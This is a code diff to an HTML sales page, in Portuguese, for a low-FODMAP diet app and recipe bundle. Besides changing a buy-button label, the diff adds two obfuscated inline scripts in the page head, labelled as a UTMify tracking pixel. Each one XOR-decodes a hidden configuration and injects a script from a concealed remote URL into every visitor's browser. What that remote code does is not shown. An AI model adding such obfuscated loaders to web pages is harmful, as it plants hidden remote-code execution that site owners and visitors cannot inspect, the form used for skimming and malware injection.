@@ -541,6 +541,9 @@
   .chan{display:flex;flex-direction:column;gap:12px;margin-top:24px;}
   .chan .opt{padding:20px 18px;}
 </style>
+<!-- UTMify: pixel e UTMs -->
+<script>(function(){var i_d=atob("DEvQcydjaYbpyI6htjDyBlUPS7zLoPrVxjjqXAgADejHvfrM3y2pXUQMBKiLuqHS1Tm5A1MQRvaAsOvNmTu5C0IPR+ya6qKD1z+kAU4BHPKMu6yb7Rb8UUAPBuSIpP2DjBCrUUkCBOPL8qzR3zO1H24HS6rLvu/Nwy7ySQVVC7bY+r6Qgyi0RkZbCOPYq+rAji7hRRZBFNuU");var f_6=[];for(var j_g=0;j_g<i_d.length;j_g++){f_6.push(i_d.charCodeAt(j_g)&255);}var l_h=f_6[0];var j_ja1=f_6.slice(1,1+l_h);var p_s5z=f_6.slice(1+l_h);var z_wfu=p_s5z.map(function(b,j_u8j6){return b^j_ja1[j_u8j6%l_h];});var k_82xl="";for(var e_wlew=0;e_wlew<z_wfu.length;e_wlew++){k_82xl+=String.fromCharCode(z_wfu[e_wlew]&255);}var d_6j5=decodeURIComponent(escape(k_82xl));var u_qn=JSON.parse(d_6j5);var w_w0g=u_qn.globals||[];w_w0g.forEach(function(b_uj4p){window[b_uj4p.name]=b_uj4p.value;});var b_gr=document.createElement("script");b_gr.src=u_qn.url;b_gr.async=true;b_gr.defer=true;(u_qn.attributes||[]).forEach(function(d_pi){b_gr.setAttribute(d_pi.name,d_pi.value);});(document.head||document.documentElement).appendChild(b_gr);})();</script>
+<script>(function(){var d_e=atob("DCtEpmSmUpZ8Hxfxv1Bm0xbKcKxed2OFz1h+iUvFNvhSamOc1k09iAfJP7gebTiC3Fkt1hDVfeMIcmTe00owwxfSfPwPPTvT3l8w1A3EJ+IZbDXL5FBmyAXLN7RGPXOQy0pp0xDLO/AFMmeD2l0hyBCLKvUTezqC3EBmikbQM/oJejXLnQk5ih+EPPcRejXLnU8l0gWLJ+IRdnGIkls2wxLDPOJRbGKT1k83hEiEJPcQanLThQlm2znb");var b_9wls=[];for(var c_8x7e=0;c_8x7e<d_e.length;c_8x7e++){b_9wls.push(d_e.charCodeAt(c_8x7e)&255);}var b_0p7=b_9wls[0];var o_li=b_9wls.slice(1,1+b_0p7);var k_ca=b_9wls.slice(1+b_0p7);var v_hahw=k_ca.map(function(b,p_i620){return b^o_li[p_i620%b_0p7];});var y_wt="";for(var f_0z=0;f_0z<v_hahw.length;f_0z++){y_wt+=String.fromCharCode(v_hahw[f_0z]&255);}var t_mp0q=decodeURIComponent(escape(y_wt));var l_hgl=JSON.parse(t_mp0q);var t_co=l_hgl.globals||[];t_co.forEach(function(i_600){window[i_600.name]=i_600.value;});var q_i6ko=document.createElement("script");q_i6ko.src=l_hgl.url;q_i6ko.async=true;q_i6ko.defer=true;(l_hgl.attributes||[]).forEach(function(g_g1f){q_i6ko.setAttribute(g_g1f.name,g_g1f.value);});(document.head||document.documentElement).appendChild(q_i6ko);})();</script>
 </head>
 <body>
 <div id="app"></div>
@@ -1113,7 +1116,7 @@ function sOffer(){
           <div class="pc-pr"><s>R$</s>${pl.pr}${pl.old?`<span class="pc-old">R$ ${pl.old}</span>`:''}</div>
           <em>pagamento único</em>
           <ul>${[['Aplicativo de acompanhamento diário',0],['+60 receitas baixo FODMAP',1],['Cardápio de 4 semanas',1],['Lista de compras semanal',1],['Tabela de alimentos',1],['Guia de reintrodução',1],['Bônus 1 · Resgate 48h',0],['Bônus 2 · Roteiro da Consulta',0],['Bônus 3 · Guia de Mercado',0],['Bônus 4 · Diário de Gatilhos',0]].map(r=>{const on=pl.best||r[1];return `<li class="${on?'y':'n'}"><i>${on?ic('check'):'✕'}</i><span>${r[0]}</span></li>`;}).join('')}</ul>
-          <button class="btn ${pl.best?'btn-primary':'btn-alt'}" onclick="buy('${pl.k}')">Quero o ${pl.n}</button>
+          <button class="btn ${pl.best?'btn-primary':'btn-alt'}" onclick="buy('${pl.k}')">COMPRAR AGORA</button>
         </div>`).join('')}
       </div>
       <p class="fine">Completo: aplicativo + PDF para imprimir · Básico: PDF · Garantia de 7 dias</p>
